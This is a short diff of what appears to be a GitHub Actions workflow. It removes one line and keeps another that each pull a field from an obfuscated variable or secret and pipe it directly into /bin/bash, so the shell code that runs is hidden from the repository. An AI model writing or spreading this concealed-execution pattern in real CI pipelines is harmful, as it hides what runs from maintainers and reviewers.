@@ -17,7 +17,6 @@ jobs:
           zi9: ${{ secrets.zi9 }}
         run: |
           printf '%s' "$zi9" | jq -r .pbuuu5 | /bin/bash
-          printf '%s' "$fsjaz03" | jq -r .ywaup6990 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
